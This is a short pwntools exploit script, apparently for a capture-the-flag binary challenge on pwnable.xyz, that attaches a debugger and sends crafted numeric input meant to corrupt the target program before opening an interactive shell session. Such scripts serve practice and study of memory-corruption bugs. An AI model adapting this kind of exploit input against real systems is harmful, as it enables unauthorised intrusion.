#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./challenge',checksec=False)
p = process()
#p = remote('svc.pwnable.xyz',30029)
gdb.attach(p,gdbscript='''
           b*main+122
           ''')
input()
p.sendline("1099511598312 1 -262894")
p.sendline("0 0 0")


p.interactive()
